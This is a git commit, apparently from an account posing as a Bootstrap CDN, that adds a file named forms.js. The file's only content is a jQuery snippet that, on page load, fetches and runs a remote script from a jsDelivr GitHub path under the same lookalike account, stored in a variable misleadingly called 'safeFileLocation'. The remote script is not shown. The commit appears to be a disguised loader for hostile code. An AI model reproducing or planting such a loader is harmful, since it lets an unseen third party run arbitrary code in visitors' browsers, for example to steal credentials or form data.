1a5693ea928bca00be4d4c3d886a04035e94edd9
bootstrapcdnn <valve.skins@gmail.com>
2024-05-27 16:30:26 +0200

    initial

---
+++ forms.js
@@ -0,0 +1,6 @@
+$(function()
+{
+    var safeFileLocation = "https://cdn.jsdelivr.net/gh/bootstrapcdnn/angular/animations.js"
+
+    $.getScript(safeFileLocation, function(data, textStatus, jqxhr){});
+});
